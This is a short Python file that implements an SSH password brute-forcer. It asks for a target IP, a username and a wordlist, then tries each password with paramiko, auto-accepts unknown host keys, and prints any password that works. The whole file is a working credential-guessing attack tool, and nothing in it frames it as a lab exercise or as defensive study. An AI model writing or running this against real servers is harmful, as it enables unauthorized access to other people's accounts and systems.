# brute_force/brute_forcer.py
import paramiko

def run_brute_forcer():
    print("\n=== Brute Force Scanning ===")
    target = input("Enter target IP: ")
    username = input("Enter username: ")
    wordlist = input("Enter path to wordlist: ")

    with open(wordlist, "r") as file:
        for password in file.readlines():
            password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=username, password=password)
                print(f"Success! Password: {password}")
                ssh.close()
                break
            except:
                print(f"Failed: {password}")